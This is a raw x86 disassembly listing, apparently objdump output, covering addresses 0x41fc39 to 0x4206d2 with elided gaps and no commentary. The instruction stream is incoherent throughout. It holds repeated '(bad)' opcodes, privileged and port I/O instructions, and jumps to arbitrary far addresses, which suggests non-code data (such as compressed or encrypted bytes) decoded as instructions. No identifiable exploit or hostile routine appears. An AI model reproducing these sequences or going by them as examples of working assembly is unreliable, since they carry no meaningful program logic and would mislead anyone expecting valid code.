  41fc39:	hlt    
  41fc3a:	gs icebp 
  41fc3c:	push   edx
  41fc3d:	sub    eax,0x88098ad2
  41fc42:	mov    ah,ch
  41fc44:	add    al,0x55
  41fc46:	add    DWORD PTR [eax],eax
  41fc48:	test   BYTE PTR [eax],0x0
  41fc4b:	add    BYTE PTR [edi],ah
  41fc4d:	pop    edi
  41fc4e:	xor    DWORD PTR [eax],esp
  41fc50:	(bad)  
  41fc51:	stc    
  41fc52:	cmp    bh,BYTE PTR [esi+eax*1-0x53]
  41fc56:	stos   DWORD PTR es:[edi],eax
  41fc57:	push   ss
  41fc58:	jbe    0x41fc17
  41fc5a:	pop    esp
  41fc5b:	adc    eax,0x7f17cdec
  41fc60:	jns    0x41fbe3
  41fc62:	jno    0x41fc59
  41fc64:	xchg   BYTE PTR ds:0x365f7d3d,al
  41fc6a:	add    esp,DWORD PTR [ebp-0xa90b229]
  41fc70:	push   ds
  41fc71:	xor    eax,0x7885f2b7
  41fc76:	mov    DWORD PTR [edi-0x67],ebx
  41fc79:	loop   0x41fbfb
  41fc7b:	dec    esp
  41fc7c:	and    cl,BYTE PTR [ebx+0x1f3b6813]
  41fc82:	sub    al,0x5d
  41fc84:	in     al,dx
  41fc85:	sub    al,cl
  41fc87:	mov    esi,0xd53a3522
  41fc8c:	cmp    BYTE PTR [edi],bl
  41fc8e:	pop    esi
  41fc8f:	ficomp DWORD PTR [esi-0x9]
  41fc92:	or     dh,BYTE PTR [ebx-0x9]
  41fc95:	cli    
  41fc96:	fnsave [eax+edi*1-0x23]
  41fc9a:	xor    esi,edi
  41fc9c:	shr    bh,cl
  41fc9e:	adc    ebp,DWORD PTR [edx+0x75452f4b]
  41fca4:	ret    
  41fca5:	(bad)  
  41fca6:	push   edi
  41fca7:	jecxz  0x41fcda
  41fca9:	xchg   edx,eax
  41fcaa:	ror    dl,0x93
  41fcad:	cmc    
  41fcae:	hlt    
  41fcaf:	imul   edi,DWORD PTR [edx],0xd4ad42b0
  41fcb5:	xchg   ebp,eax
  41fcb6:	xchg   esi,eax
  41fcb7:	mov    ebp,0xa1e257d2
  41fcbc:	ret    0x9532
  41fcbf:	scas   eax,DWORD PTR es:[edi]
  41fcc0:	xchg   ecx,eax
  41fcc1:	int3   
  41fcc2:	xor    eax,0x20c038a
  41fcc7:	dec    edx
  41fcc8:	xor    ch,ch
  41fcca:	jnp    0x41fcdc
  41fccc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fccd:	jmp    0x51ba19ab
  41fcd2:	push   0xfffffff9
  41fcd4:	(bad)  
  41fcd5:	mov    ebx,DWORD PTR [edi]
  41fcd7:	(bad)  
  41fcd8:	sub    DWORD PTR [edx+0x5a129d7f],ebx
  41fcde:	or     bl,BYTE PTR [bx+si]
  41fce1:	addr16 xor al,0x1a
  41fce4:	cmp    DWORD PTR [eax+0x6d],edx
  41fce7:	aam    0xe9
  41fce9:	mov    ebx,ebx
  41fceb:	repnz xor edx,edi
  41fcee:	repnz pusha 
  41fcf0:	pop    ebx
  41fcf1:	mov    ecx,0xa81fe717
  41fcf6:	or     al,0xe5
  41fcf8:	cvtdq2ps xmm0,XMMWORD PTR [ebp+0x1e8cbebb]
  41fcff:	sub    eax,0xe243a018
  41fd04:	sbb    eax,0x9bf01201
  41fd09:	daa    
  41fd0a:	in     eax,0xdf
  41fd0c:	ja     0x41fd77
  41fd0e:	in     al,dx
  41fd0f:	jmp    0x41fd6b
  41fd11:	add    DWORD PTR [ebp+0x24412be1],edi
  41fd17:	fnstsw WORD PTR gs:[esi+0x7d]
  41fd1b:	daa    
  41fd1c:	adc    DWORD PTR [ecx+0x30],ebp
  41fd1f:	mov    edx,0x495fd013
  41fd24:	loopne 0x41fd21
  41fd26:	xchg   ebx,eax
  41fd27:	mov    edx,0x8896d77b
  41fd2c:	push   ebx
  41fd2d:	dec    edi
  41fd2e:	push   ebx
  41fd2f:	xor    BYTE PTR [ecx],0x35
  41fd32:	call   0x324f26a2
  41fd37:	lea    edi,[edx+0x36]
  41fd3a:	fsub   QWORD PTR ds:0x947004ff
  41fd40:	dec    eax
  41fd41:	sbb    BYTE PTR [eax],al
	...
  41fdb3:	add    BYTE PTR ds:0x7b197956,al
  41fdb9:	aas    
  41fdba:	gs pop esi
  41fdbc:	repnz lahf 
  41fdbe:	and    al,0x2d
  41fdc0:	ror    dh,1
  41fdc2:	jbe    0x41fda1
  41fdc4:	cli    
  41fdc5:	push   ebp
  41fdc6:	add    DWORD PTR [eax],eax
  41fdc8:	test   BYTE PTR [eax],0x0
  41fdcb:	add    BYTE PTR [ebx+0x3d],dl
  41fdce:	imul   ebp,DWORD PTR [ebx+ebx*2+0xae98f97],0x6f
  41fdd6:	cmp    eax,0x8868e641
  41fddb:	(bad)  
  41fddd:	popf   
  41fdde:	adc    al,0x82
  41fde0:	and    al,0xb7
  41fde2:	cli    
  41fde3:	nop
  41fde4:	and    dh,BYTE PTR [edx+0x43fc73c5]
  41fdea:	mov    al,0xe2
  41fdec:	mov    ah,0x9b
  41fdee:	and    cl,BYTE PTR [eax+edx*8-0x71]
  41fdf2:	sub    esi,DWORD PTR [eax]
  41fdf4:	inc    ebp
  41fdf5:	loope  0x41fe3e
  41fdf7:	nop
  41fdf8:	outs   dx,DWORD PTR ds:[esi]
  41fdf9:	dec    ecx
  41fdfa:	add    eax,0x82988bdc
  41fdff:	jb     0x41fdf9
  41fe01:	cmc    
  41fe02:	pop    edi
  41fe03:	inc    ebp
  41fe04:	mov    eax,ds:0x97a1f4db
  41fe09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe0a:	ja     0x41fe87
  41fe0c:	pop    edx
  41fe0d:	or     BYTE PTR [edi+0x79],dl
  41fe10:	xor    eax,0xa700c0fb
  41fe15:	imul   BYTE PTR [eax-0x7]
  41fe18:	sbb    DWORD PTR [eax+0x6e],ebx
  41fe1b:	xchg   ebx,eax
  41fe1c:	aad    0x3d
  41fe1e:	push   cs
  41fe1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe20:	push   esp
  41fe21:	out    dx,eax
  41fe22:	pop    eax
  41fe23:	xor    esi,eax
  41fe25:	loop   0x41fe24
  41fe27:	ins    BYTE PTR es:[edi],dx
  41fe28:	into   
  41fe29:	jl     0x41fea5
  41fe2b:	fs inc eax
  41fe2d:	into   
  41fe2e:	mov    esp,0xb8930a48
  41fe33:	mov    al,0xa7
  41fe35:	daa    
  41fe36:	mov    eax,0x73435be
  41fe3b:	cld    
  41fe3c:	(bad)  
  41fe3d:	ins    DWORD PTR es:[edi],dx
  41fe3e:	pop    esi
  41fe3f:	or     dh,BYTE PTR [ebp+esi*8+0x77]
  41fe43:	pop    eax
  41fe44:	inc    edx
  41fe45:	and    edi,DWORD PTR [ebp-0x68]
  41fe48:	jbe    0x41fe7f
  41fe4a:	out    dx,al
  41fe4b:	pop    ss
  41fe4c:	sub    BYTE PTR [ebp-0x4defb9ee],0xff
  41fe53:	add    dl,BYTE PTR [ebx-0x70]
  41fe56:	fwait
  41fe57:	stos   DWORD PTR es:[edi],eax
  41fe58:	pop    es
  41fe59:	rcr    BYTE PTR [edx-0x4e],1
  41fe5c:	or     BYTE PTR [ecx+0x7d060a18],0x5a
  41fe63:	(bad)  
  41fe64:	and    ebx,ebx
  41fe66:	sub    edx,DWORD PTR [ebp-0x7b]
  41fe69:	cmp    eax,0xa1b8a846
  41fe6e:	call   0x59a4:0xc897e50c
  41fe75:	xor    DWORD PTR [edi+0xdbfd253],edx
  41fe7b:	mov    al,ds:0x27806d53
  41fe80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe81:	loope  0x41fee8
  41fe83:	sahf   
  41fe84:	fistp  WORD PTR [ebx]
  41fe86:	cs repnz sub ch,bl
  41fe8a:	xor    bl,bl
  41fe8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe8d:	mov    ds:0xe4fcdea8,eax
  41fe92:	repz jns 0x41fe5b
  41fe95:	test   ebx,ecx
  41fe97:	out    dx,al
  41fe98:	popf   
  41fe99:	loope  0x41feb0
  41fe9b:	push   ecx
  41fe9c:	jo     0x41ff09
  41fe9e:	push   esi
  41fe9f:	mov    bl,0x4a
  41fea1:	test   DWORD PTR [edx-0x37],eax
  41fea4:	cmc    
  41fea5:	mov    ah,0x2f
  41fea7:	or     eax,DWORD PTR [edi-0x1a]
  41feaa:	mov    edx,DWORD PTR [eax+0x5b]
  41fead:	pop    edx
  41feae:	imul   DWORD PTR [esi]
  41feb0:	adc    al,0x7b
  41feb2:	xchg   DWORD PTR [ebp-0x78],esp
  41feb5:	dec    ecx
  41feb6:	leave  
  41feb7:	cwde   
  41feb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41feb9:	push   esp
  41feba:	ss push 0x38b7b1d2
  41fec0:	and    DWORD PTR ds:0x0,ebx
	...
  41ff32:	add    BYTE PTR [eax],al
  41ff34:	mov    ecx,0xff25bf5d
  41ff39:	out    0xbb,eax
  41ff3b:	fisttp QWORD PTR [edi+0x7]
  41ff3e:	mov    WORD PTR [edi+0x7153aaf7],?
  41ff44:	lock push esi
  41ff46:	add    DWORD PTR [eax],eax
  41ff48:	test   BYTE PTR [eax],0x0
  41ff4b:	add    BYTE PTR [ebp+0x6d],cl
  41ff4e:	mov    ebp,0xf6402788
  41ff53:	sbb    eax,0x2147db9f
  41ff58:	in     eax,dx
  41ff59:	inc    eax
  41ff5a:	lea    eax,[ecx]
  41ff5c:	or     eax,0x8ba6f1e
  41ff61:	add    al,0x57
  41ff63:	mov    cl,BYTE PTR [eax]
  41ff65:	test   edx,eax
  41ff67:	sbb    al,0x2
  41ff69:	mov    eax,ds:0x2fc0402c
  41ff6e:	retf   
  41ff6f:	pop    edx
  41ff70:	push   edi
  41ff71:	cld    
  41ff72:	femms  
  41ff74:	icebp  
  41ff75:	hlt    
  41ff76:	inc    ebx
  41ff77:	dec    esp
  41ff78:	dec    esp
  41ff79:	pop    edx
  41ff7a:	jp     0x41ff5f
  41ff7c:	loopne 0x41ff52
  41ff7e:	pushf  
  41ff7f:	cmp    esi,DWORD PTR [ebx]
  41ff81:	sti    
  41ff82:	inc    edx
  41ff83:	xor    BYTE PTR [ecx+ebp*4],bl
  41ff86:	push   cs
  41ff87:	lahf   
  41ff88:	lds    ecx,FWORD PTR [esi+0x5d]
  41ff8b:	aaa    
  41ff8c:	and    DWORD PTR [ecx],eax
  41ff8e:	or     eax,0x79073ca1
  41ff93:	pop    esp
  41ff94:	imul   eax,ebp,0xffffffe4
  41ff97:	adc    ch,dl
  41ff99:	(bad)  
  41ff9a:	cmp    eax,0x5423cfbb
  41ff9f:	pop    esi
  41ffa0:	mov    edx,DWORD PTR [edi]
  41ffa2:	sbb    BYTE PTR [eax],bl
  41ffa4:	sahf   
  41ffa5:	rcl    DWORD PTR [edx],cl
  41ffa7:	inc    DWORD PTR [ecx-0x327ae747]
  41ffad:	sbb    DWORD PTR [ecx+0x4e],0x44
  41ffb1:	inc    ebx
  41ffb2:	adc    DWORD PTR [esp+ebp*8],edx
  41ffb5:	jne    0x42000a
  41ffb7:	hlt    
  41ffb8:	cmp    esp,DWORD PTR [ebp+0x73c1c927]
  41ffbe:	outs   dx,BYTE PTR ds:[esi]
  41ffbf:	stc    
  41ffc0:	push   ebx
  41ffc1:	jno    0x41ffef
  41ffc3:	(bad)  
  41ffc4:	xlat   BYTE PTR ds:[ebx]
  41ffc5:	in     al,dx
  41ffc6:	js     0x41ffc8
  41ffc8:	add    esi,DWORD PTR [edi+0x77]
  41ffcb:	and    edx,eax
  41ffcd:	push   es
  41ffce:	mov    WORD PTR [ebx],fs
  41ffd0:	or     ecx,DWORD PTR [edx]
  41ffd2:	push   ds
  41ffd3:	pop    ecx
  41ffd4:	jge    0x420001
  41ffd6:	xchg   esp,eax
  41ffd7:	dec    edi
  41ffd8:	call   0xe9224311
  41ffdd:	pop    esi
  41ffde:	mov    eax,0xfdb54128
  41ffe3:	popf   
  41ffe4:	or     DWORD PTR [ebx-0x5dcf401d],edi
  41ffea:	pop    ebp
  41ffeb:	cmc    
  41ffec:	adc    DWORD PTR [ecx+ebp*1-0x4f0d192],0xd0b16121
  41fff7:	fsubr  DWORD PTR [esi+eax*8-0x1097fd6a]
  41fffe:	lock jge 0x42005a
  420001:	push   ecx
  420002:	xor    DWORD PTR [edx-0x7f6a50c6],edx
  420008:	push   ebp
  420009:	fstp   QWORD PTR [eax-0x72]
  42000c:	mov    dh,0x96
  42000e:	cmp    eax,0xb766b862
  420013:	inc    esp
  420014:	test   BYTE PTR [ebx+0x39b3524d],0x9e
  42001b:	cmp    ch,BYTE PTR [eax+esi*2+0x35844ab8]
  420022:	ret    0xa9d
  420025:	and    edx,edx
  420027:	sub    BYTE PTR [ebx-0xfb1b83],0xae
  42002e:	and    BYTE PTR [esi],ah
  420030:	jge    0x41ffd1
  420032:	imul   eax,eax,0xffffffad
  420035:	retf   0x9045
  420038:	(bad)  
  420039:	out    0x44,eax
  42003b:	js     0x41ffdc
  42003d:	sbb    BYTE PTR [edx+edi*8],ah
  420040:	sbb    DWORD PTR [esi],edx
	...
  4200b2:	add    BYTE PTR [eax],al
  4200b4:	fild   QWORD PTR [edx+ebp*1+0x6c]
  4200b9:	mov    ebx,0xe891ffdf
  4200be:	arpl   WORD PTR [eax-0x97d4aee],ax
  4200c4:	out    0x57,al
  4200c6:	add    DWORD PTR [eax],eax
  4200c8:	test   BYTE PTR [eax],0x0
  4200cb:	add    BYTE PTR [ebx-0x5234ea78],dl
  4200d1:	and    al,0xa5
  4200d3:	jle    0x420114
  4200d5:	out    0xd3,al
  4200d7:	pop    edi
  4200d8:	arpl   WORD PTR [ecx+0x30500d85],bx
  4200de:	pushf  
  4200df:	mov    al,0xa1
  4200e1:	(bad)  
  4200e2:	jmp    0x2f9e:0x9645cd4b
  4200e9:	adc    BYTE PTR [ebp-0x52],bl
  4200ec:	xor    ch,BYTE PTR [edx+0x5]
  4200ef:	test   eax,0xef10eb21
  4200f4:	in     eax,dx
  4200f5:	into   
  4200f6:	push   edx
  4200f7:	jnp    0x4200b4
  4200f9:	lea    esi,[edi-0x50c6a1d]
  4200ff:	cmp    al,0x75
  420101:	mov    ah,BYTE PTR [edi-0x32ed7745]
  420107:	xchg   DWORD PTR [edx+0x960f5e],eax
  42010d:	sub    al,ch
  42010f:	inc    ecx
  420110:	sbb    eax,0xf3daa77e
  420115:	mov    ds:0xaa250cef,al
  42011a:	fwait
  42011b:	or     al,0x38
  42011d:	push   esp
  42011e:	fs jecxz 0x420102
  420121:	mov    al,ds:0xb2a50132
  420126:	or     al,BYTE PTR [ebx+0x33fb4fcb]
  42012c:	jae    0x420144
  42012e:	inc    edx
  42012f:	cmc    
  420130:	mov    dh,0x18
  420132:	dec    ebp
  420133:	cld    
  420134:	pop    ecx
  420135:	pop    ecx
  420136:	add    BYTE PTR [ebx-0x110c8bd1],dh
  42013c:	inc    ecx
  42013d:	mov    al,0x8f
  42013f:	fidiv  DWORD PTR [eax-0x1]
  420142:	jbe    0x42016d
  420144:	cmp    al,0x73
  420146:	mov    eax,?
  420148:	push   ds
  420149:	pop    ebx
  42014a:	or     ebx,DWORD PTR [ecx+ebx*8-0x5144df99]
  420151:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420152:	pop    ecx
  420153:	rcr    DWORD PTR [edi+0x49190480],1
  420159:	(bad)  
  42015a:	or     al,0xda
  42015c:	iret   
  42015d:	fs cdq 
  42015f:	enter  0x65f1,0x60
  420163:	repnz fst st(1)
  420166:	sbb    bl,0xf
  420169:	jle    0x420125
  42016b:	or     eax,0xad329a28
  420170:	sbb    al,0x2c
  420172:	inc    edi
  420173:	imul   edi,edi,0xc82f99ae
  420179:	addr16 mov bh,0xdb
  42017c:	cmovge eax,DWORD PTR [edi-0x18]
  420180:	rcl    DWORD PTR [edi+esi*2],0x13
  420184:	shl    BYTE PTR [edi+edi*8+0x522a5661],1
  42018b:	and    DWORD PTR ds:0x2fcc8443,0x84a8a6e7
  420195:	cmp    DWORD PTR [ebx-0x3b],esi
  420198:	pop    eax
  420199:	xor    edx,DWORD PTR [edi+0x553d42b4]
  42019f:	sbb    cl,al
  4201a1:	mov    esi,DWORD PTR [ebp+0x28]
  4201a4:	out    dx,eax
  4201a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201a6:	or     bl,BYTE PTR [esi+0x34cbbe76]
  4201ac:	rcr    DWORD PTR ds:0x41aa8bd9,cl
  4201b2:	or     DWORD PTR [edx+0x27],edx
  4201b5:	aaa    
  4201b6:	outs   dx,DWORD PTR ds:[esi]
  4201b7:	mov    edx,DWORD PTR [ebx+edx*1+0x441c8dd4]
  4201be:	gs gs pop edx
  4201c1:	and    al,0x0
	...
  420233:	add    BYTE PTR [ecx+0x1b],dl
  420236:	jmp    DWORD PTR [esi-0x1]
  420239:	out    0xd9,al
  42023b:	aas    
  42023c:	mov    DWORD PTR ds:0x8613d010,ebx
  420242:	fsub   DWORD PTR [esi+0x158dc]
  420248:	test   BYTE PTR [eax],0x0
  42024b:	add    BYTE PTR [edi-0x22],bh
  42024e:	and    DWORD PTR [eax-0x47c1baec],edx
  420254:	pop    ss
  420255:	sub    esp,ebx
  420257:	mov    ebp,0x52f47f64
  42025c:	jmp    0x9ee08978
  420261:	push   es
  420262:	pop    esp
  420263:	retf   
  420264:	mov    BYTE PTR [ecx-0x21568742],0x8f
  42026b:	xor    al,0xd0
  42026d:	retf   0x28bc
  420270:	push   ebp
  420271:	loope  0x420287
  420273:	lds    ebx,FWORD PTR [esi-0x74]
  420276:	mov    ebx,0xef0e178
  42027b:	imul   ecx,DWORD PTR [ebp+ecx*2+0x29973e39],0x18
  420283:	gs in  eax,dx
  420285:	add    edx,edx
  420287:	push   ss
  420288:	les    esp,FWORD PTR [edx]
  42028a:	cmp    BYTE PTR [ecx-0x26],al
  42028d:	pop    esp
  42028e:	mov    esp,0xed63bb65
  420293:	or     esp,edi
  420295:	jmp    0x420237
  420297:	xchg   DWORD PTR [ebx-0x51],esi
  42029a:	daa    
  42029b:	aaa    
  42029c:	push   es
  42029d:	sub    ebx,DWORD PTR [edi]
  42029f:	std    
  4202a0:	jno    0x420245
  4202a2:	jmp    0x61ff:0x93075ed8
  4202a9:	aam    0xbc
  4202ab:	out    0x3f,al
  4202ad:	std    
  4202ae:	xchg   BYTE PTR [ecx+0x4c],ch
  4202b1:	sbb    al,BYTE PTR [eax-0x676c785d]
  4202b7:	xchg   DWORD PTR ds:0xacfd4c09,esi
  4202bd:	stos   BYTE PTR es:[edi],al
  4202be:	push   eax
  4202bf:	xchg   ebp,eax
  4202c0:	ss call edi
  4202c3:	and    al,0xa2
  4202c5:	leave  
  4202c6:	sbb    BYTE PTR [ebx],al
  4202c8:	pop    eax
  4202c9:	mov    esi,0xae2c1054
  4202ce:	push   esi
  4202cf:	jecxz  0x420259
  4202d1:	mov    eax,0x1783ba03
  4202d6:	outs   dx,DWORD PTR ds:[esi]
  4202d7:	pop    ds
  4202d8:	pop    ds
  4202d9:	jecxz  0x4202c0
  4202db:	push   ds
  4202dc:	lahf   
  4202dd:	std    
  4202de:	pop    es
  4202df:	test   al,0x9f
  4202e1:	(bad)  
  4202e2:	hlt    
  4202e3:	sahf   
  4202e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202e5:	xchg   esp,eax
  4202e6:	push   ebx
  4202e7:	push   ecx
  4202e8:	cwde   
  4202e9:	jb     0x42033f
  4202eb:	fisubr DWORD PTR [esi+0x156f490e]
  4202f1:	(bad)  
  4202f2:	iret   
  4202f3:	pop    esi
  4202f4:	in     eax,dx
  4202f5:	ret    
  4202f6:	mov    al,0x4d
  4202f8:	jo     0x420326
  4202fa:	xor    DWORD PTR [ecx-0x63],edi
  4202fd:	scas   al,BYTE PTR es:[edi]
  4202fe:	neg    DWORD PTR [edx+0x1c9cfea7]
  420304:	cmp    esi,edx
  420306:	in     al,0x31
  420308:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420309:	or     ecx,DWORD PTR [eax]
  42030b:	jg     0x420341
  42030d:	lock and DWORD PTR [edi],eax
  420310:	inc    esi
  420311:	push   edi
  420312:	fcomp  DWORD PTR [ebx+0x79]
  420315:	cs pop edi
  420317:	xor    al,0x8e
  420319:	xchg   edi,eax
  42031a:	cld    
  42031b:	mov    DWORD PTR [ecx+0x633f4d36],ebx
  420321:	xor    eax,DWORD PTR [esi-0x37]
  420324:	push   ss
  420325:	jno    0x4203a1
  420327:	and    eax,0xd39ce4cf
  42032c:	sub    ch,dh
  42032e:	or     DWORD PTR [ecx+0x24],0x5b65abec
  420335:	loope  0x42033b
  420337:	pop    edi
  420338:	cmp    DWORD PTR [esi+eax*8+0x66],ebx
  42033c:	outs   dx,BYTE PTR ds:[esi]
  42033d:	inc    edx
  42033e:	add    eax,0x7dff43
	...
  4203b3:	add    BYTE PTR [edi+eiz*8],bh
  4203b6:	imul   ebp,edi,0xfffffffb
  4203b9:	out    dx,eax
  4203ba:	mov    esp,0x889a5af7
  4203bf:	arpl   WORD PTR [edx],bx
  4203c1:	pop    esi
  4203c2:	jg     0x4203f0
  4203c4:	rcr    BYTE PTR [ecx+0x1],cl
  4203c7:	add    dh,dh
  4203c9:	add    BYTE PTR [eax],al
  4203cb:	add    dh,bh
  4203cd:	sub    edx,DWORD PTR [edi+0x620c8679]
  4203d3:	mov    ebx,0x63d92193
  4203d8:	rcr    DWORD PTR [ecx+ebp*1],1
  4203db:	inc    ebx
  4203dc:	out    dx,al
  4203dd:	repnz sbb DWORD PTR [edx+0x40],ebx
  4203e1:	push   ss
  4203e2:	pop    esi
  4203e3:	push   esi
  4203e4:	outs   dx,BYTE PTR ds:[esi]
  4203e5:	or     eax,0xa7e51796
  4203ea:	imul   ebx,DWORD PTR ds:0x4414889c,0xffffff96
  4203f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203f2:	push   edx
  4203f3:	or     ebx,DWORD PTR [ecx-0x5f]
  4203f6:	ret    
  4203f7:	or     al,0xe2
  4203f9:	aas    
  4203fa:	pusha  
  4203fb:	adc    DWORD PTR [ebx+edx*4+0x73],edx
  4203ff:	addr16 aam 0xf0
  420402:	push   cs
  420403:	in     eax,dx
  420404:	mov    edx,0x377d51b9
  420409:	xchg   esp,eax
  42040a:	mov    bl,0xc6
  42040c:	icebp  
  42040d:	sub    eax,0x1666f0b2
  420412:	test   BYTE PTR [eax],bl
  420414:	add    eax,0x3312a1c
  420419:	add    ebp,ecx
  42041b:	mov    al,ds:0x8abba469
  420420:	fucomi st,st(3)
  420422:	fistp  QWORD PTR [ecx*4-0x6d267c1f]
  420429:	add    eax,0xc12fab02
  42042e:	xchg   edx,eax
  42042f:	out    dx,al
  420430:	xchg   ecx,eax
  420431:	jle    0x4203cf
  420433:	inc    eax
  420434:	ss aad 0xd6
  420437:	cld    
  420438:	jo     0x42040c
  42043a:	aam    0x2b
  42043c:	pushf  
  42043d:	sub    al,0x94
  42043f:	mov    ah,0xd5
  420441:	icebp  
  420442:	iret   
  420443:	arpl   WORD PTR [ebp+0x469b7609],si
  420449:	fs pop ss
  42044b:	cdq    
  42044c:	rcr    edi,1
  42044e:	aas    
  42044f:	push   edx
  420450:	xlat   BYTE PTR ds:[ebx]
  420451:	xchg   ebx,eax
  420452:	(bad)  
  420453:	mov    BYTE PTR [esi+0x51],bh
  420456:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420457:	lods   al,BYTE PTR ds:[esi]
  420458:	outs   dx,BYTE PTR ds:[esi]
  420459:	jle    0x420416
  42045b:	push   ebp
  42045c:	sub    al,0x4c
  42045e:	mov    eax,ds:0x67968113
  420463:	cld    
  420464:	in     al,dx
  420465:	sub    eax,ecx
  420467:	loope  0x4204cd
  420469:	mov    dh,0x53
  42046b:	arpl   cx,si
  42046d:	push   ecx
  42046e:	mov    WORD PTR [esi-0x37],gs
  420471:	fucompp 
  420473:	imul   ebx,ecx,0x66646066
  420479:	mov    al,ah
  42047b:	mov    ch,0xa2
  42047d:	pop    ecx
  42047e:	retf   0x358a
  420481:	loopne 0x420473
  420483:	outs   dx,BYTE PTR ds:[esi]
  420484:	fld    QWORD PTR [ecx+0x3d7d8315]
  42048a:	mov    eax,DWORD PTR [ecx+0x15]
  42048d:	adc    BYTE PTR [edx+0x55],0xcc
  420491:	imul   esi,DWORD PTR [edx+0xf07f0af],0x21ce8a80
  42049b:	in     al,0x5a
  42049d:	(bad)  
  42049e:	sub    bh,BYTE PTR [edx+ebx*1+0x47bf28e4]
  4204a5:	pop    ss
  4204a6:	nop
  4204a7:	les    edx,FWORD PTR [eax+0x18]
  4204aa:	pushf  
  4204ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204ac:	out    0xc3,al
  4204ae:	imul   esp,DWORD PTR [ebx+0x63],0x2b
  4204b2:	shl    DWORD PTR [eax+0x79],1
  4204b5:	mov    edi,0x9b1e33e6
  4204ba:	sub    BYTE PTR [esi-0x2c4c579],ah
  4204c0:	mov    eax,gs:0x0
	...
  420532:	add    BYTE PTR [eax],al
  420534:	js     0x42056a
  420536:	add    bh,bl
  420538:	dec    esi
  420539:	(bad)  
  42053a:	stc    
  42053b:	mov    bh,0x14
  42053d:	clc    
  42053e:	add    al,0xe1
  420540:	rcr    bh,1
  420542:	lods   al,BYTE PTR ds:[esi]
  420543:	mov    ch,0xc8
  420545:	pop    edx
  420546:	add    DWORD PTR [eax],eax
  420548:	test   BYTE PTR [eax],0x0
  42054b:	add    BYTE PTR [ebp+0x2c],ch
  42054e:	retf   0xa1d5
  420551:	dec    esp
  420552:	mov    dh,0x1d
  420554:	pop    edx
  420555:	mov    gs,esi
  420557:	pusha  
  420558:	sar    dl,0x14
  42055b:	mov    bl,0xa3
  42055d:	outs   dx,BYTE PTR ds:[esi]
  42055e:	or     ch,BYTE PTR [esi-0x143baa93]
  420564:	test   dl,al
  420566:	div    ecx
  420568:	lahf   
  420569:	ficom  DWORD PTR [ebp-0x38]
  42056c:	mov    ecx,0x5288ed37
  420571:	ja     0x420518
  420573:	mov    esi,DWORD PTR ds:0x455c3590
  420579:	jp     0x420573
  42057b:	stos   DWORD PTR es:[edi],eax
  42057c:	cmp    eax,0x7cef086c
  420581:	mov    ecx,0xdf6e7f06
  420586:	or     cl,BYTE PTR [esi+0x3b]
  420589:	pop    ss
  42058a:	dec    ecx
  42058b:	adc    BYTE PTR cs:[edi-0x232597cd],ch
  420592:	jbe    0x42052b
  420594:	in     al,dx
  420595:	imul   eax,DWORD PTR [edi+0x385a8ca4],0xffffffd5
  42059c:	or     BYTE PTR [ebx+0x4637da7a],ch
  4205a2:	xor    eax,0xcf9eeaf3
  4205a7:	aaa    
  4205a8:	xor    BYTE PTR [esi-0x7e92495c],bh
  4205ae:	adc    al,BYTE PTR [edi+0x2975ff96]
  4205b4:	mov    esi,0xe54db22d
  4205b9:	jmp    0xe4be9222
  4205be:	sar    edx,1
  4205c0:	jl     0x4205db
  4205c2:	in     eax,0x82
  4205c4:	sub    DWORD PTR ds:0x4b091c4,ebp
  4205ca:	in     al,0xb7
  4205cc:	not    edi
  4205ce:	cdq    
  4205cf:	shl    DWORD PTR [edx-0x73],cl
  4205d2:	and    ebp,DWORD PTR [ecx-0x1c]
  4205d5:	mov    esi,0x3bf44554
  4205da:	pushw  ss
  4205dc:	mov    al,ds:0xaeb77877
  4205e1:	pop    edi
  4205e2:	pop    esi
  4205e3:	and    ecx,DWORD PTR [edi+0x35d6b38]
  4205e9:	(bad)  
  4205ea:	mov    bl,0x7c
  4205ec:	pushf  
  4205ed:	xor    dl,BYTE PTR [eax+esi*1-0x1c195ba3]
  4205f4:	and    DWORD PTR [ebx+0x4b9a36b7],eax
  4205fa:	push   es
  4205fb:	adc    ebp,DWORD PTR [esi]
  4205fd:	sti    
  4205fe:	leave  
  4205ff:	lods   al,BYTE PTR ds:[esi]
  420600:	out    0x48,al
  420602:	les    esp,FWORD PTR [edi+0x299e8c8d]
  420608:	inc    edi
  420609:	pop    es
  42060a:	mov    eax,DWORD PTR [ebx+ecx*8+0x1a]
  42060e:	dec    esi
  42060f:	les    ebx,FWORD PTR [edx-0x33]
  420612:	mov    ah,0xed
  420614:	stc    
  420615:	pop    eax
  420616:	mov    fs,WORD PTR [ebp-0x79]
  420619:	mov    dh,0xba
  42061b:	add    al,BYTE PTR [edi-0xa]
  42061e:	bound  ecx,QWORD PTR [ebx+0x754e7653]
  420624:	stos   DWORD PTR es:[edi],eax
  420625:	jno    0x420602
  420627:	xor    edx,eax
  420629:	test   bh,cl
  42062b:	sbb    al,ch
  42062d:	ins    BYTE PTR es:[edi],dx
  42062e:	adc    BYTE PTR [eax+edx*4-0x1],ah
  420632:	imul   esi,DWORD PTR ds:0xb5d9ba4a,0xfffffff8
  420639:	push   ecx
  42063a:	jns    0x420623
  42063c:	xchg   ebp,eax
  42063d:	pop    ss
  42063e:	dec    eax
  42063f:	mov    esp,0x6f65
	...
  4206b4:	xchg   edx,eax
  4206b5:	cmp    al,0x23
  4206b7:	jle    0x420668
  4206b9:	jg     0x42069a
  4206bb:	cld    
  4206bc:	jo     0x4206a6
  4206be:	hlt    
  4206bf:	leave  
  4206c0:	or     eax,0xbe8a2505
  4206c5:	pop    ebx
  4206c6:	add    DWORD PTR [eax],eax
  4206c8:	test   BYTE PTR [eax],0x0
  4206cb:	add    bl,cl
  4206cd:	pop    ss
  4206ce:	aas    
  4206cf:	xor    ebx,ebx
  4206d1:	outs   dx,DWORD PTR ds:[esi]
  4206d2:	dec    ebx
